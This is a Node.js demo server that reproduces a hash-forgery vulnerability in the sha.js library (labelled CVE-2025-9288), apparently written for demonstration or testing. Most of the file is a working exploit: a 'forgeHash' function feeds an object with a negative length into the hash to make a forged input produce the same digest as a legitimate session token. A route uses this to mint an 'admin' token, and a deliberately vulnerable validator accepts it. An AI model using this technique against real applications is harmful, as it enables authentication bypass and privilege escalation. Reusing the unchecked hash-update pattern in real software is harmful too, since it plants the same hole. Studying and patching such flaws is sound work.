const http = require('http')
const fs = require('fs')
const path = require('path')
const sha = require('sha.js')
const crypto = require('crypto')

const PORT = 3000

// Official PoC function
const forgeHash = (data, payload) => {
    return JSON.stringify([
        payload, 
        { length: -payload.length }, 
        [...data]
    ])
}

// Vulnerable hash function (sha.js â‰¤2.4.11)
const sha256 = (...messages) => {
    const hash = sha('sha256')
    messages.forEach((m) => hash.update(m))
    return hash.digest('hex')
}

// Simulated user database
const users = {
    'user123': {
        username: 'john_doe',
        email: 'john@example.com',
        role: 'user',
        permissions: ['read']
    },
    'admin456': {
        username: 'admin',
        email: 'admin@example.com',
        role: 'admin',
        permissions: ['read', 'write', 'delete']
    }
}

// Store generated tokens for demonstration
let generatedTokens = {}


function validateToken(tokenData, providedHash) {
    const hash = sha('sha256')
    
    if (Array.isArray(tokenData)) {
        tokenData.forEach(item => hash.update(item))
    } else {
        hash.update(tokenData)
    }
    
    const calculatedHash = hash.digest('hex')
    return calculatedHash === providedHash
}


function generateToken(userId) {
    const sessionData = Buffer.concat([
        crypto.randomBytes(16),
        Buffer.from(userId),
        crypto.randomBytes(16)
    ])
    
    const hash = sha('sha256')
    hash.update(sessionData)
    const tokenHash = hash.digest('hex')
    
    const token = {
        sessionData: sessionData.toString('hex'),
        tokenHash: tokenHash,
        userId: userId,
        timestamp: new Date().toISOString()
    }
    
   
    generatedTokens[tokenHash] = {
        type: 'legitimate',
        token: token
    }
    
    return token
}


const server = http.createServer((req, res) => {
    if (req.method === 'GET' && req.url === '/') {
        fs.readFile(path.join(__dirname, 'public', 'index.html'), (err, data) => {
            if (err) {
                res.writeHead(500)
                res.end('Error loading page')
                return
            }
            res.writeHead(200, { 'Content-Type': 'text/html' })
            res.end(data)
        })
        return
    }

    
    if (req.method === 'POST' && req.url === '/api/generate-token') {
        try {
            const userId = 'user123'
            const token = generateToken(userId)
            
            res.writeHead(200, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({
                success: true,
                token: token,
                explanation: 'This is a LEGITIMATE token generated by the server using random data'
            }))
        } catch (err) {
            res.writeHead(500, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ error: err.message }))
        }
        return
    }

    
    if (req.method === 'POST' && req.url === '/api/exploit') {
        try {
            
            const legitimateTokenHash = req.headers['x-target-hash']
            
            if (!generatedTokens[legitimateTokenHash]) {
                res.writeHead(400, { 'Content-Type': 'application/json' })
                res.end(JSON.stringify({ 
                    error: 'First generate a legitimate token by clicking "Step 1"' 
                }))
                return
            }

            
            const legitimateToken = generatedTokens[legitimateTokenHash].token
            const legitimateSessionData = Buffer.from(legitimateToken.sessionData, 'hex')

           
            const maliciousPayload = 'ADMIN_USER_FORGED'  
            
            
            const forgedPayload = forgeHash(legitimateSessionData, maliciousPayload)
            const forgedArray = JSON.parse(forgedPayload)

            
            const forgedHash = sha256(...forgedArray)

            
            const forgedToken = {
                sessionData: legitimateSessionData.toString('hex'),
                tokenHash: forgedHash,
                userId: 'admin456',
                timestamp: new Date().toISOString()
            }

           
            generatedTokens[forgedHash] = {
                type: 'forged',
                token: forgedToken
            }

            res.writeHead(200, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({
                success: true,
                exploit: {
                    step1: 'Took the legitimate session data from the generated token',
                    step2: 'Created a malicious payload string',
                    step3: 'Used negative length to rewind hash calculation',
                    step4: forgedHash,
                    step5: 'Legitimate hash is: ' + legitimateTokenHash,
                    hashes_match: forgedHash === legitimateTokenHash,
                    warning: forgedHash === legitimateTokenHash ? 
                        'VULNERABILITY CONFIRMED: Forged token has SAME hash as legitimate token!' :
                        'Hashes do not match (might be patched version)'
                },
                forgedToken: forgedToken,
                maliciousPayload: maliciousPayload,
                legitimateTokenHash: legitimateTokenHash
            }))
        } catch (err) {
            res.writeHead(500, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ error: err.message }))
        }
        return
    }

    
    if (req.method === 'POST' && req.url === '/api/verify-token') {
        let body = ''
        req.on('data', chunk => { body += chunk.toString() })
        req.on('end', () => {
            try {
                const { sessionData, tokenHash } = JSON.parse(body)
                const sessionBuffer = Buffer.from(sessionData, 'hex')
                
                const isValid = validateToken(sessionBuffer, tokenHash)
                const tokenInfo = generatedTokens[tokenHash]
                
                res.writeHead(200, { 'Content-Type': 'application/json' })
                res.end(JSON.stringify({
                    isValid: isValid,
                    tokenType: tokenInfo?.type || 'unknown',
                    userId: tokenInfo?.token?.userId || 'unknown',
                    message: isValid ? 
                        'Token validation PASSED (server would grant access)' : 
                        'Token validation FAILED'
                }))
            } catch (err) {
                res.writeHead(400, { 'Content-Type': 'application/json' })
                res.end(JSON.stringify({ error: err.message }))
            }
        })
        return
    }

    res.writeHead(404)
    res.end('Not Found')
})

server.listen(PORT, () => {
    console.log(`CVE-2025-9288 Demo running at http://localhost:${PORT}`)
    console.log(`Open your browser to: http://localhost:${PORT}`)
})
